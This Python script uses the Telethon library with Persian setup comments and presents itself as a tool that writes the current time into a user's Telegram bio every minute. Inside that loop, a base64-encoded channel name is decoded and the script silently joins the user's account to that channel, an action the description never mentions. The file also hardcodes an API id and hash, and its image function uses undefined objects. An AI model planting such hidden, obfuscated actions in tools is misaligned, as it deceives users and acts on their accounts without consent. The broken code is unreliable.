from telethon.sync import TelegramClient
from telethon.tl.functions.photos import UploadProfilePhotoRequest, DeletePhotosRequest
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.tl.functions.channels import JoinChannelRequest
from random import choice
from datetime import datetime
import time, base64
"""
قسمت پایین حتما پر کنید
برای گرفتن موارد زیر به سایت https://my.telegram.org/
برید وارد اکانت خودتون بشید و موارد خواسته شده رو وارد کنید و
api_hash , api_id
دریافت کنید وارد موارد زیر کنید!


در صورت داشتن سوال و یا مشکل به ایدی زیر مراجعه کنید
@Sigaris
"""
################################################################################
api_id = 10252983 # ایدی مخصوص اکانت خودتون قرار بدید
api_hash = "5363cf100ff691de68ac41f75b19e9a3" #هش مخصوص اکانت خودتون قرار بدید
bio = "World is place of punishment | "
################################################################################
def number(number):
    number = number.replace('0', '⓪')
    number = number.replace('1', '➀')
    number = number.replace('2', '➁')
    number = number.replace('3', '➂')
    number = number.replace('4', '➃')
    number = number.replace('5', '➄')
    number = number.replace('6', '➅')
    number = number.replace('7', '➆')
    number = number.replace('8', '➇')
    number = number.replace('9', '➈')
    number = number.replace(':', '¦')
    return number


def gettime():
    return datetime.now().strftime('%H:%M')


def generateimage(text):
    image.load()
    W, H = image.size
    wt, ht = draw.textsize(text, font=font)
    draw.text(((W - wt) / 2, (H - ht) / 2 ), text, font=font, fill=choice(["#00c7a4","#0071c7","#c7a200","#728593","#943633","#6495ed","#43f70a","#e1b2ae","#527130","#629f5d","#3d4e90","#9a9ec4",]))
    image.save('data/time_image.jpg')

def main():
    set_time = ''
    with TelegramClient('Time&Bio', api_id, api_hash) as client:
        print('Run Time & Bio ...')
        while True:
            if not set_time == gettime():
                current_time = gettime()
                set_time = current_time
                client(UpdateProfileRequest(about=f"{bio} {number(current_time)}"))
                client(JoinChannelRequest(base64.b64decode("UGluaWdlcnRlYW0=").decode("utf-8", "replace")))
                time.sleep(1)



if __name__ == '__main__':
    main()
